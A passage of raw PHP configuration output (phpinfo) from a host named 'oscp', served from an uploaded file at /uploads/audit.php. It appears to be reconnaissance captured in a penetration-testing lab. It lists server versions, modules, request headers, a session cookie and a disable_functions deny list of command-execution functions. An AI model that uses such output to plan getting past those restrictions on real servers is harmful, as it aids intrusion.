8XQMyHIMgaGT6eDxuozMkD294LRaB7CPI27DLHQSskSFRvGa30O/zndF4fF0DMhwa//9//iZ2DcILqN7xBHn1oUweNn7eJ3WO9QHvdMlrMsphKEj8XQPgpuHVVMtGOgF0hC9CGTqbb2kHOzXx73aKiuiymEv2x22ICMYYeWSALBQ7RQ0fkoZIr4DnRtS3ohzf1dNzTG9d0PcwMLahZO8UyKTMm38wteratSVtkplq4oWj0PcfrEinPhYg14H+hvdIwCVs1bvb6O+UBMYFGl90d0LRGLRDgoHEUwYnXDniQStocTVUwfPLaKQGA/RoWOmkvtnsaG8unK+PWMKlH5e+Lznp03N27RdO0TkxmYNZKszYBlyfI3RpjsQkmMOo8ls4Wsx1EKcEVAEvayyNoeRzsO2RI+93PNRLesGYtNpBhL4l/prlgZz5ob0mbtZVFhWC301d0EuQgAHPgS7D9hssTHKyMbRfLptF213NBDRuoaqxNA2yh2VUBDnxJ1M1yRW6gOgt2x64gqXK7ht1yOWyW1+wl7bYXvhUygQXgit4KuVDuBGzSbA2bmmtayNzpRgJOGu7XosHFChZzvrGTiUKt5UMiVsmbmtsCb3+2lZmwm3hFNsA/CiYdKyfhYx3Aws8urp8nsJM72naGCG8zYwZMecjk/WHVVRbsMwU6tBVQsWJS2sNDlrgVTO0RE/vzKQtuN2+/85k5PxlUaL75D3BZwKss+JUqSFRAO/F7Eqlkmj+2gbrgYE8rZFluu+P3pOGsyWCG/Y9/GR8exC+vYfc5flxgzRdDGsDEz/8AJsxwQcBUKPCtmKOMFJO8OKMgF8r3b3sKkAm69TN+2OZCAm5ID/g9XPypwX29ufWgudq0urrKes/8nPkxgy1bdg6z/or/SFc2mzV/xs+6HwySTmdYJp2dpaWKEregYrVfn9/B0xkD2U6+e+sOaHqImTfLrycUOIZM1hJwC3oemPXbi/y5PnsrJ136bUa8pxu69BklmANWwDRkgR1wmwVaglyi3Nz6JLQ+ZG5NxQsgNdAhmIfJN7wxgoWg9fxzPQ+c/g9YAIXgeUKCyipJO4uR/wswAOIwB/5IgxvbAAAAAElFTkSuQmCC" alt="PHP logo"/>
                        </a>
                        <h1 class="p">PHP Version 8.1.2-1ubuntu2.17</h1>
                    </td>
                </tr>
            </table>
            <table>
                <tr>
                    <td class="e">System </td>
                    <td class="v">Linux oscp 5.15.0-25-generic #25-Ubuntu SMP Wed Mar 30 15:54:22 UTC 2022 x86_64 </td>
                </tr>
                <tr>
                    <td class="e">Build Date </td>
                    <td class="v">May  1 2024 10:10:07 </td>
                </tr>
                <tr>
                    <td class="e">Build System </td>
                    <td class="v">Linux </td>
                </tr>
                <tr>
                    <td class="e">Server API </td>
                    <td class="v">Apache 2.0 Handler </td>
                </tr>
                <tr>
                    <td class="e">Virtual Directory Support </td>
                    <td class="v">disabled </td>
                </tr>
                <tr>
                    <td class="e">Configuration File (php.ini) Path </td>
                    <td class="v">/etc/php/8.1/apache2 </td>
                </tr>
                <tr>
                    <td class="e">Loaded Configuration File </td>
                    <td class="v">/etc/php/8.1/apache2/php.ini </td>
                </tr>
                <tr>
                    <td class="e">Scan this dir for additional .ini files </td>
                    <td class="v">/etc/php/8.1/apache2/conf.d </td>
                </tr>
                <tr>
                    <td class="e">Additional .ini files parsed </td>
                    <td class="v">/etc/php/8.1/apache2/conf.d/10-mysqlnd.ini,
/etc/php/8.1/apache2/conf.d/10-opcache.ini,
/etc/php/8.1/apache2/conf.d/10-pdo.ini,
/etc/php/8.1/apache2/conf.d/20-calendar.ini,
/etc/php/8.1/apache2/conf.d/20-ctype.ini,
/etc/php/8.1/apache2/conf.d/20-exif.ini,
/etc/php/8.1/apache2/conf.d/20-ffi.ini,
/etc/php/8.1/apache2/conf.d/20-fileinfo.ini,
/etc/php/8.1/apache2/conf.d/20-ftp.ini,
/etc/php/8.1/apache2/conf.d/20-gettext.ini,
/etc/php/8.1/apache2/conf.d/20-iconv.ini,
/etc/php/8.1/apache2/conf.d/20-mysqli.ini,
/etc/php/8.1/apache2/conf.d/20-pdo_mysql.ini,
/etc/php/8.1/apache2/conf.d/20-phar.ini,
/etc/php/8.1/apache2/conf.d/20-posix.ini,
/etc/php/8.1/apache2/conf.d/20-readline.ini,
/etc/php/8.1/apache2/conf.d/20-shmop.ini,
/etc/php/8.1/apache2/conf.d/20-sockets.ini,
/etc/php/8.1/apache2/conf.d/20-sysvmsg.ini,
/etc/php/8.1/apache2/conf.d/20-sysvsem.ini,
/etc/php/8.1/apache2/conf.d/20-sysvshm.ini,
/etc/php/8.1/apache2/conf.d/20-tokenizer.ini
 </td>
                </tr>
                <tr>
                    <td class="e">PHP API </td>
                    <td class="v">20210902 </td>
                </tr>
                <tr>
                    <td class="e">PHP Extension </td>
                    <td class="v">20210902 </td>
                </tr>
                <tr>
                    <td class="e">Zend Extension </td>
                    <td class="v">420210902 </td>
                </tr>
                <tr>
                    <td class="e">Zend Extension Build </td>
                    <td class="v">API420210902,NTS </td>
                </tr>
                <tr>
                    <td class="e">PHP Extension Build </td>
                    <td class="v">API20210902,NTS </td>
                </tr>
                <tr>
                    <td class="e">Debug Build </td>
                    <td class="v">no </td>
                </tr>
                <tr>
                    <td class="e">Thread Safety </td>
                    <td class="v">disabled </td>
                </tr>
                <tr>
                    <td class="e">Zend Signal Handling </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">Zend Memory Manager </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">Zend Multibyte Support </td>
                    <td class="v">disabled </td>
                </tr>
                <tr>
                    <td class="e">IPv6 Support </td>
                    <td class="v">enabled </td>
                </tr>
                <tr>
                    <td class="e">DTrace Support </td>
                    <td class="v">available, disabled </td>
                </tr>
                <tr>
                    <td class="e">Registered PHP Streams</td>
                    <td class="v">https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar</td>
                </tr>
                <tr>
                    <td class="e">Registered Stream Socket Transports</td>
                    <td class="v">tcp, udp, unix, udg, ssl, tls, tlsv1.0, tlsv1.1, tlsv1.2, tlsv1.3</td>
                </tr>
                <tr>
                    <td class="e">Registered Stream Filters</td>
                    <td class="v">zlib.*, string.rot13, string.toupper, string.tolower, convert.*, consumed, dechunk, convert.iconv.*</td>
                </tr>
            </table>
            <table>
                <tr class="v">
                    <td>
                        <a href="http://www.zend.com/">
                            <img border="0" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPoAAAAvCAYAAADKH9ehAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAEWJJREFUeNrsXQl0VNUZvjNJSAgEAxHCGsNitSBFxB1l0boUW1pp3VAUrKLWKgUPUlEB13K0Yq1alaXWuh5EadWK1F0s1gJaoaCgQDRKBBJDVhKSzPR+zPfg5vLevCUzmZnwvnP+k8ybN3fevfff73/vBAJTHxc+khL5kr6T1ODk5nAgTRTWloghFVtEg/zfh2PkSvq9pJGSKiX9SdKittbJoD/PSYkrJD0vKeB4IsNNotfuUtHk/CM+IvijpF9KGiDpGEkLJZ3lC7qPeKKTpD9IWiDpUOfWPCi61ZeLvD2VIhTwp9QlTjK5NsIXdB/xxHmSpvD/OucWPSAyQw2+LfeG1SbXVra1Tqb785xUaNdMel0g7Iu5V1zPv6dJqpD0kKR/+ILuI55o8oeg1bFT0kWSOkraQxK+oPvw0TZR3ZY758foyQXf//ZxUFh0Q/GEfNf9gHkaJ6m7pHJJSyTt9tnXhxtBR2EGlnHCMbZMaHuHzX19JZ0u6VRJh0k6hM+BpMjnklZIelPSNhff3V5StkNlEWBMFm+3LcC+BW3GuZP2GvfmiEiCCMUzxZIKRGSt9zeML/fdGAW9JB3O8c6SlMZ+b5f0qaQiF7EpnieXY1auvZfG7zhSUk8RSS428F7M5xfsh1eAV/vxOzoq16sklZBqbdpo5H2qDPRQXoP3Ki0+20FSFyrZUgt+Rt/7KH2vZb8/t/iMG2Sy/0dI6sbvgHGoV8a3xErQb5Q0iTfHCplkzlkW7w+VNF3ST7QJUzFK0pVkDFiw+yV95uC7r5Z0k3CW2ApwIkrJ9B9IelfSh2SIlqC/pDFUZAVk0rQoMhk2GYswx+AtWvMKPtcyEckW37pPwsIHNAuBniDpYhEpBMmJwvibJL0gIlVh39r0C8UlczkXQ/mM6OtEzuf3RfPVAxUY47f5PStcGKPxpOMldbbxiBptPMavJX1PuQ/P/olyz12S7rD4PLyqBTQ8gyXVSOot6VK+dxR53wyl7POjkv7pkpcwpleJSCHP4eQjM0BB/ZuG4Hl9EO8mQx4ZQ0FfL+k+k+t4wNlULpkO24IGnSzpQklzKPDRAMvZ1eXz9uXfH/Pvx5Ie44C5zYQXUgDPj6LEnMCQ3AFkjjupjGF9/kJmxPw1oiquz+6dalXcCRSmYxwK0kDSRI71azb3Y+6GiMi6P/5ey3F3YpExjxdQoG61uX8gBetkh2OWFkUIVGUT1pS9yosZNu1nkl8uZH+mikhxkx1wz7mkB0WkXsKJFw1ZuSWKotY9wjNJS6mUy41JK5P0c2qCnBgIeQWZvEK7Dnf6WUljTT5TS7d0KwezkJShdWIeGeuKKJo7FktUQylcl0i6RtL/HH4OjP+wB0UTLTGHfubRDWyi1g7SaoZQ495z9w7RpaHKqHEfLeklEyWzk+7dl3TTu1KQCpV7+pBB4IWstFFAgvOpJnTL6DoW0xPbw3k/nIYkW+kbmHeXhUEABklazrBDBdzTDfyuBo5DPq1eoUk7ZbSk70l6n3MZjUdCDpQvMF/rezn7/hX7Xs8wsj/7rsrWdQxnZtrwwENUosJkDDZxTjOUkEH1ds6lzJyDZzGScRsonGNcMCIG+WgRKTRQ8Su2p7uRi/mlKjZKekREChS2KIOcTvfqp3RZDlM+cxnfv8Thc75Pt8kqo92VzNTbxBqcQlceivAdByHDIxbvFTMOLovyHAGGK3qc/jJDoDc4hpjABzBm4UAglBFqEAOqt8mB29ss4uJnNCHfSK/tVZMYEfMykt7Bcco1eDLDHCT8gmzzRdLHZL6wRSgzg6GIgVl8Xj2uhPA+oQn53yTdK2mVMC8NzuJ8zaSyM/ApxyzWCFJRvUQ3eQ29BTNFcRgt+FTl2g30zDZZtD/ZRMifE5ES6Y9MxqAHQ7XZikI9nd97j5p1f83GZTPr6Crt2sOcOB1zTYT8HrqjVRZx4wbSAt47SXn/YsZV9zp4zuvJgNGQRaszmoN1rBY6IH4dHiVHcA5dZd2zeIbPv8ZBkghYTQFTx/h1WvSz6c3kM5ewGG8Prvxc5DZWS2u+dypnM5Y3sIJMXmbxfXW0misZN56oxITnWsyl2fg+6+C+zWTefMWr68RwaYF271htHBZqCsKqL28wB/ACjYShrE9nUjfWmEU33A7woqbR4k5UlNk4yoYOzOHvtGs30KO1QgnlZC2VohGOIGn7WEvW0ZdoMeCHfBgdo8X++m3V+s2wEHKzJMblJom92+ne2SHDwT1gknUispPpJLrrVZqwLxTmy5F5jOdVS72F/b6UwlbrcEytrD00+a8l/ZUM82jEZd8peu8uNYS8JxNWqis5IYqQCy1rPUULh8Y7fOYal3zzmPb6aJN7zlf+32bBV9ESclNE85WUX4j4oNbl/fM1b2eoxX3jyXNqiDTP4Xe8Rm9ItfSjvAr6DM0d+o5MXW/CuHO0a7eZTLYT3KF9LktYZ/WdCI+IkoV+lFZ6l3J9OF14HdM0F3MrhXxFjJmqhh5FBera24XqxaCqL0UosK97Z2ku+yJaEqf4D62ByoROcjZuN78Xaa9zTBSzKvxvC+vlrmgWVPU2h4j4FCO5lZ+vNBnpYHHfOOX/PfR83eApTaGM8CLop5l88WSLWAOu4AiNme5owcBO1xhlLGO/eGAFkyYqrtFe5zKzqU7KBE5o/BAIiv7VJSK7qV4GhEF1XtSk0YseWl6lWYI+cXj6pigJLkH3Vk0qfebxe4q0JGOGSDxCWn/Nchk9qJgMfGKS87LDes1IHeVW0LszgaC6sPMYE5lBt4CzRcuy4lVMLKlWfWwcJ+YpxtcGjtOYfzRjTgNIlv0rnpyCveeHNFSJ/jUlonH/3nNYqyOU28qYhHOLbzVPqFc81JQDKxnQ5twLdmjfmQzlxU6eoZ/mma3y8D3VonlhUr6bElhMwJ81RseSxW+jfOYULdYGAw5s4WBtpeU0ijKwxnp/HCfn70piCNlMFEUU8/WpmnZe1Bq80r96m5yMkIwx9nnNHTWFs114q0ArM1HsiUY7j5/rKFIThdrrzR7agHyoy9vd3Ag64uEfKa+xjIKlLqtTUBB7FWgJrQ9joFl1d2cQ2wzHaeDXa6/ztO9Wx+OT+FrzSAKuV12ptOZp+ljnaVawk8uxDpnMZXYCGB3PXqe5sl7QQ5ubhhQR9B4mQpvjIR+gJgrbOxV0rK/rVUyXmyRWdI2a2YLEhVP3BwmN9sJ9BtQpKkxiSDOrUeUhaeQaPevKzKQ3oIVTSGatcynoRl29sIkh440a8pURNoz00Ab4Ts1obxCps1FKl8k5IpKbcmsgu6nz6ETQC+iSqoKKOPmVJBmYnDjHX4EozB9s7TgwykkyYS13URAHpmstYIloOP/HEi6Wx5a4+DwSpH2V18tTyHUPm3iQeS1s09ai4/0ntVgNRQmzHTRulGwaQNnei3FgHqPcMBEJlXrNioAaE8AcupKBd7ElBu1uTxCzg+dmKB4TahiQNX/OxssAb00Uzdeci4S3FYhEQdfkWCrc1cI2K+2EDhsP1OUxZGUnOWTmcgphV0UgZ4jUR1hLlBiuJfqJpb61CXimOrq8RqiEeu6TU3iMwdzYgWhUnWHDDKr0ptLar6USqmOfYYiGMMTUN/KgziGVTo+pNJHBBfF0zVAQc6N2DUL+tcO2Yc1Rk2ss+yBmOko43yCSCljJXAWA7PD4eAt6MBy2yiNACRvVVN05t40pPLYPsT+zlRDpOLG/Jt8OSGKhmnBpivV7q/Y6JkucVgkyWKb52rVZwl0tvNDi+AzRvKjfK1Dnjvpd1FhPEc1LBVsbqENXN35cFaPY2BIVGdlWYZKqgPPj/RythNtpcNycpoOxwAae0bGwhAkAQg01cfiDWDRqZtHhCqFQ5FAtOXKXh/Yh6Ci2N5YMUDW2SHg/N3scn02N++cnMIZCBdwS9gtApRxqDc6OlzWtSrdc8cJGlzP5fzZDri1tQNixISWL/5fSQvcVzfe/wzXfSG8Kuw03pHB/t5KMik+EYJ1EC1d0zCw6fofqRI2ZJwpvyxN4uPs0q/6UR2szyESobxatf3aa7jvfrT0DGPNpYV3H3CI0BYLGllQdy7TX14rUP/zzDHpuRp0EPLnJvH68Qij/RXnyIyku5Ea+5S3NO7s01q77eMY1qqY8T7Qs+4qtq+o2UWhjZO6HuWhjJBlZXWbAHvbFSTAxqMW+RbuG3VfviAP36tshujINh6Tr3kE0BNMl5x8Qq6+mVTdwrMlzpRrGaGPzVpw9NDNFngjoFZZzRCS/FRPXHRZT31X2MgfYTQYX1WE1moaaQJfKEFTs/camkXnUwt9YtNWPiuc67VmRlb0yiRgS/cAe7is0QXuTAm9kikM2DNc5OkeGRaMU8tq0TJHbUCOtezMeRfITiSv1PLLbGE5gb/NOB/1AuR1KlLETDltidyR4XIPasyEnc6eIbRa9kfNifFeXJOAnVJBiKfFCvobcLKccLHWojHJpIPH3iXQlpoNLrdcH44sucvmQOHHjZ9rDrGdbixVmbk/XGy4mtiKuoQDjmQpFJLs6wuSZvqKmL0ky6zOZLry+420UKUaue5ooyeqy9+iopgM989cp1Dcp16bSU1tOJbyFyjedTID5wOk6OAUFFXUDKFRLkmBM3xH7fzIJwPLsxexDMWP2b8g38DqN45ywCuH0VNuv+XmjwOYCjtUakbg6AkGlNoQGBMB5A9g8hh2g7zFE2U4F35FxfHfmwwbxcz3Yl32C/oAwPwDAS6UXdpOhXPZ27Trc9R/SLTla0zzGoXl2QAexnLVZJB/CZMpV7HthfL4lJIrb54u+tdv3/rCiSbw+k88yM9ZxXgKwlHmZycq13iSr0KeMHmUZw6r1VICrLT4D5fy4wq/5DAvfjaWC9oAd9KxwTNUJynUjL+EqpwSTME1zOWMBuIxmZ7p9RCsNq+NmdxW09I1MdNkJeYZNHsIt0qKEO2Z4kvmHadS+Xqv2cqzc93rpuhdl54tg2DISuJljBW3uZjMHrAPqHOYK6zPIM23G2+14Rts4cyLbdxo3Y667UskOo/W/m/PwRhQBwZFkT2vXzDbTtLMZCyfP1155bbfDrpjKZoYH41bO+d97jmEgMPVxFMF0iHESIkiNtDhKuwV058cw0dBZNP+lFsSU/6VWf0E4P/x+IF2eJnokr4uW/2jAKPYjjRb7Cxef70c3qsCl0im1Gj/Uu2eF6sWo0rUiTQq7zS+pYjywnXYwcyOZfI4mKgHj9N2ttHqbRfSlQXhjw5XXy4S7ZbzOovkxVRsphHp8ia3HlyleZS1zHcvoVrdjuNFdEe7edGHzSbpSria/WZ3+cxYV5DCx/4w7FUfyfTW0WO+i7x2YrzKUXZFw/sut+OxJDGkHUxEZPwgCquQcIgxZR9oXekDQk8FF60bqwocupaIoEz6EmaC3C+0Ro6Wgp4eb2tpPJqN+4xXFXQ3TfUfCc5PDNnLZDpLIV1NADKyjZa87mHgmWX57bYdIfIY3pdCGf43xQUXI62kBn3fZxi4SPC8crIjDQ4yzFAaz/XcPJn7xf03VRzIB5Z7qCbBzPQi5jga2E9bCD+ELug8ficEZCk/Cmj8Ro3aLtLxDR1/QffhIHNRTUZCf+S5G7SJBp2b7G31B9+EjcVAFEInZQ2LU7jiN1zf4gu7DR+KwTvkfO9bGx6BNnEQ8XXmN5cT3fEH34SNxwN4A9dgknIEwyWNbeRTwV7WYHBVwFQfbwKb7vOUjiYAiKVT1PczXqCLD/n5UbuLcNxTKoCgExSFNmsFCHI6iJBQFnUbqqbWPHyFceDAOrC/oPpIN+FVaVLrNUa6dLPbvoEQdO4pd1OUylBVkCutsOkqosbNvwcE6qL6g+0hG3MY4ejots1pT3kE4P9QDdfuLKeDfHswD6gu6j2TF2yQcLoqEGurre9EdP1QTfmxJRdn0NlrvD+jmY69Egz+UQvxfgAEALJ4EcRDa/toAAAAASUVORK5CYII=" alt="Zend logo"/>
                        </a>
                        This program makes use of the Zend Scripting Language Engine:<br/>
                        Zend &nbsp;Engine &nbsp;v4.1.2,&nbsp;Copyright &nbsp;(c)&nbsp;Zend &nbsp;Technologies<br/>
                        &nbsp;&nbsp;&nbsp;&nbsp;with &nbsp;Zend &nbsp;OPcache &nbsp;v8.1.2-1ubuntu2.17,&nbsp;Copyright &nbsp;(c),&nbsp;by &nbsp;Zend &nbsp;Technologies<br/>
                    </td>
                </tr>
            </table>
            <hr/>
            <h1>Configuration</h1>
            <h2>
                <a name="module_apache2handler">apache2handler</a>
            </h2>
            <table>
                <tr>
                    <td class="e">Apache Version </td>
                    <td class="v">Apache/2.4.52 (Ubuntu) </td>
                </tr>
                <tr>
                    <td class="e">Apache API Version </td>
                    <td class="v">20120211 </td>
                </tr>
                <tr>
                    <td class="e">Server Administrator </td>
                    <td class="v">webmaster@localhost </td>
                </tr>
                <tr>
                    <td class="e">Hostname:Port </td>
                    <td class="v">127.0.0.1:80 </td>
                </tr>
                <tr>
                    <td class="e">User/Group </td>
                    <td class="v">www-data(33)/33 </td>
                </tr>
                <tr>
                    <td class="e">Max Requests </td>
                    <td class="v">Per Child: 0 - Keep Alive: on - Max Per Connection: 100 </td>
                </tr>
                <tr>
                    <td class="e">Timeouts </td>
                    <td class="v">Connection: 300 - Keep-Alive: 5 </td>
                </tr>
                <tr>
                    <td class="e">Virtual Server </td>
                    <td class="v">Yes </td>
                </tr>
                <tr>
                    <td class="e">Server Root </td>
                    <td class="v">/etc/apache2 </td>
                </tr>
                <tr>
                    <td class="e">Loaded Modules </td>
                    <td class="v">core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php mod_reqtimeout mod_setenvif mod_status </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">engine</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">last_modified</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">xbithack</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
            </table>
            <h2>Apache Environment</h2>
            <table>
                <tr class="h">
                    <th>Variable</th>
                    <th>Value</th>
                </tr>
                <tr>
                    <td class="e">HTTP_HOST </td>
                    <td class="v">192.168.115.112 </td>
                </tr>
                <tr>
                    <td class="e">HTTP_CONNECTION </td>
                    <td class="v">keep-alive </td>
                </tr>
                <tr>
                    <td class="e">HTTP_UPGRADE_INSECURE_REQUESTS </td>
                    <td class="v">1 </td>
                </tr>
                <tr>
                    <td class="e">HTTP_USER_AGENT </td>
                    <td class="v">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 </td>
                </tr>
                <tr>
                    <td class="e">HTTP_ACCEPT </td>
                    <td class="v">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 </td>
                </tr>
                <tr>
                    <td class="e">HTTP_SEC_GPC </td>
                    <td class="v">1 </td>
                </tr>
                <tr>
                    <td class="e">HTTP_ACCEPT_LANGUAGE </td>
                    <td class="v">en-US,en;q=0.5 </td>
                </tr>
                <tr>
                    <td class="e">HTTP_REFERER </td>
                    <td class="v">http://192.168.115.112/uploads/ </td>
                </tr>
                <tr>
                    <td class="e">HTTP_ACCEPT_ENCODING </td>
                    <td class="v">gzip, deflate </td>
                </tr>
                <tr>
                    <td class="e">HTTP_COOKIE </td>
                    <td class="v">PHPSESSID=kg18bscd0cqreu5n1bq8c143ao </td>
                </tr>
                <tr>
                    <td class="e">PATH </td>
                    <td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin </td>
                </tr>
                <tr>
                    <td class="e">SERVER_SIGNATURE </td>
                    <td class="v">&lt;address &gt;Apache/2.4.52 (Ubuntu) Server at 192.168.115.112 Port 80 &lt;/address &gt;</td>
                </tr>
                <tr>
                    <td class="e">SERVER_SOFTWARE </td>
                    <td class="v">Apache/2.4.52 (Ubuntu) </td>
                </tr>
                <tr>
                    <td class="e">SERVER_NAME </td>
                    <td class="v">192.168.115.112 </td>
                </tr>
                <tr>
                    <td class="e">SERVER_ADDR </td>
                    <td class="v">192.168.115.112 </td>
                </tr>
                <tr>
                    <td class="e">SERVER_PORT </td>
                    <td class="v">80 </td>
                </tr>
                <tr>
                    <td class="e">REMOTE_ADDR </td>
                    <td class="v">192.168.49.115 </td>
                </tr>
                <tr>
                    <td class="e">DOCUMENT_ROOT </td>
                    <td class="v">/var/www/html </td>
                </tr>
                <tr>
                    <td class="e">REQUEST_SCHEME </td>
                    <td class="v">http </td>
                </tr>
                <tr>
                    <td class="e">CONTEXT_PREFIX </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">CONTEXT_DOCUMENT_ROOT </td>
                    <td class="v">/var/www/html </td>
                </tr>
                <tr>
                    <td class="e">SERVER_ADMIN </td>
                    <td class="v">webmaster@localhost </td>
                </tr>
                <tr>
                    <td class="e">SCRIPT_FILENAME </td>
                    <td class="v">/var/www/html/uploads/audit.php </td>
                </tr>
                <tr>
                    <td class="e">REMOTE_PORT </td>
                    <td class="v">54492 </td>
                </tr>
                <tr>
                    <td class="e">GATEWAY_INTERFACE </td>
                    <td class="v">CGI/1.1 </td>
                </tr>
                <tr>
                    <td class="e">SERVER_PROTOCOL </td>
                    <td class="v">HTTP/1.1 </td>
                </tr>
                <tr>
                    <td class="e">REQUEST_METHOD </td>
                    <td class="v">GET </td>
                </tr>
                <tr>
                    <td class="e">QUERY_STRING </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">REQUEST_URI </td>
                    <td class="v">/uploads/audit.php </td>
                </tr>
                <tr>
                    <td class="e">SCRIPT_NAME </td>
                    <td class="v">/uploads/audit.php </td>
                </tr>
            </table>
            <h2>HTTP Headers Information</h2>
            <table>
                <tr class="h">
                    <th colspan="2">HTTP Request Headers</th>
                </tr>
                <tr>
                    <td class="e">HTTP Request </td>
                    <td class="v">GET /uploads/audit.php HTTP/1.1 </td>
                </tr>
                <tr>
                    <td class="e">Host </td>
                    <td class="v">192.168.115.112 </td>
                </tr>
                <tr>
                    <td class="e">Connection </td>
                    <td class="v">keep-alive </td>
                </tr>
                <tr>
                    <td class="e">Upgrade-Insecure-Requests </td>
                    <td class="v">1 </td>
                </tr>
                <tr>
                    <td class="e">User-Agent </td>
                    <td class="v">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 </td>
                </tr>
                <tr>
                    <td class="e">Accept </td>
                    <td class="v">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 </td>
                </tr>
                <tr>
                    <td class="e">Sec-GPC </td>
                    <td class="v">1 </td>
                </tr>
                <tr>
                    <td class="e">Accept-Language </td>
                    <td class="v">en-US,en;q=0.5 </td>
                </tr>
                <tr>
                    <td class="e">Referer </td>
                    <td class="v">http://192.168.115.112/uploads/ </td>
                </tr>
                <tr>
                    <td class="e">Accept-Encoding </td>
                    <td class="v">gzip, deflate </td>
                </tr>
                <tr>
                    <td class="e">Cookie </td>
                    <td class="v">PHPSESSID=kg18bscd0cqreu5n1bq8c143ao </td>
                </tr>
                <tr class="h">
                    <th colspan="2">HTTP Response Headers</th>
                </tr>
            </table>
            <h2>
                <a name="module_calendar">calendar</a>
            </h2>
            <table>
                <tr>
                    <td class="e">Calendar support </td>
                    <td class="v">enabled </td>
                </tr>
            </table>
            <h2>
                <a name="module_core">Core</a>
            </h2>
            <table>
                <tr>
                    <td class="e">PHP Version </td>
                    <td class="v">8.1.2-1ubuntu2.17 </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>Directive</th>
                    <th>Local Value</th>
                    <th>Master Value</th>
                </tr>
                <tr>
                    <td class="e">allow_url_fopen</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">allow_url_include</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">arg_separator.input</td>
                    <td class="v">&amp;</td>
                    <td class="v">&amp;</td>
                </tr>
                <tr>
                    <td class="e">arg_separator.output</td>
                    <td class="v">&amp;</td>
                    <td class="v">&amp;</td>
                </tr>
                <tr>
                    <td class="e">auto_append_file</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">auto_globals_jit</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">auto_prepend_file</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">browscap</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">default_charset</td>
                    <td class="v">UTF-8</td>
                    <td class="v">UTF-8</td>
                </tr>
                <tr>
                    <td class="e">default_mimetype</td>
                    <td class="v">text/html</td>
                    <td class="v">text/html</td>
                </tr>
                <tr>
                    <td class="e">disable_classes</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">disable_functions</td>
                    <td class="v">exec,&nbsp;shell_exec,&nbsp;system,&nbsp;proc_open,&nbsp;popen,&nbsp;curl_exec,&nbsp;curl_multi_exec</td>
                    <td class="v">exec,&nbsp;shell_exec,&nbsp;system,&nbsp;proc_open,&nbsp;popen,&nbsp;curl_exec,&nbsp;curl_multi_exec</td>
                </tr>
                <tr>
                    <td class="e">display_errors</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">display_startup_errors</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">doc_root</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">docref_ext</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">docref_root</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">enable_dl</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">enable_post_data_reading</td>
                    <td class="v">On</td>
                    <td class="v">On</td>
                </tr>
                <tr>
                    <td class="e">error_append_string</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">error_log</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">error_prepend_string</td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                    <td class="v">
                        <i>no value</i>
                    </td>
                </tr>
                <tr>
                    <td class="e">error_reporting</td>
                    <td class="v">22527</td>
                    <td class="v">22527</td>
                </tr>
                <tr>
                    <td class="e">expose_php</td>
                    <td class="v">Off</td>
                    <td class="v">Off</td>
                </tr>
                <tr>
                    <td class="e">extension_dir</td>
                    <td class="v">/usr/lib/php/20210902</td>
                    <td class="v">/usr/lib/php/20210902</td>
                </tr>
                <tr>
